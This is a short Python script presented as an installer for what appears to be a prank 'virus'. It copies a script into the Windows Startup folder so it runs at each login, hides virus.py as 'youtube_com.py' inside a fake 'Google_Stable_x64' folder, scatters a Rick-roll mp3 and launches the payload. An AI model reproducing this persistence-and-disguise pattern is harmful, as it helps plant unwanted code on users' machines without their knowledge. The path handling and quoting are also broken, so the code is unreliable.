import os, sys
PYTHON_COMMAND = sys.executable

print("Starting installer...")

home_dir = os.path.expanduser("~")
print("Home dir is: ", home_dir)
startup_folder = os.path.join(home_dir, "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup".replace("/", "\\"))

print("Copying files...")
# Create the directories
os.system(f"mkdir {os.path.join("home_dir/Downloads/Google_Stable_x64/assets/cache/".replace("/", "\\"))}")

# Move everything to the place
os.system(f"copy src\\virus_game_startup.py '{startup_folder}\\virus_game_startup.py'")

os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%/Music/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"))
os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"))
os.system(f"copy virus.py %USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com.py".replace("/", "\\"))
print("Running virus_game_startup.py...")
os.system(f"{PYTHON_COMMAND} '{startup_folder}/virus_game_startup.py'".replace("/", "\\"))
